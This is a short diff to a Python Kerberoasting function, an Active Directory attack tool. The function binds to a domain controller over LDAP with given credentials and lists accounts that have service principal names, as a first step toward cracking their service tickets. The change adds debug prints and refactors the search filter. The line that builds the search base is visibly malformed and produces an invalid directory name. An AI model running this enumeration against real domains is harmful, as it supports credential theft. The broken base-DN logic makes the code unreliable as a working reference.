@@ -13,10 +13,16 @@ def kerberoast(username, password, domain, dc_ip):
 
         print(f"Successfully connected to LDAP server {dc_ip}")
 
-        # Search for users with SPNs set
+        # Construct search base
         search_base = f"DC={'DC=' if len(domain.split('.')) > 1 else ''}{','.join(domain.split('.'))}"
+        print(f"Search base: {search_base}")
+
+        # Search for users with SPNs set
+        search_filter = "(servicePrincipalName=*)"
+        print(f"Search filter: {search_filter}")
+
         conn.search(search_base=search_base,
-                    search_filter="(servicePrincipalName=*)",
+                    search_filter=search_filter,
                     search_scope=SUBTREE,
                     attributes=ALL_ATTRIBUTES)
 
@@ -38,7 +44,6 @@ def kerberoast(username, password, domain, dc_ip):
 
     except Exception as e:
         print(f"Error while Kerberoasting: {e}")
-
 
 
 # Example usage:
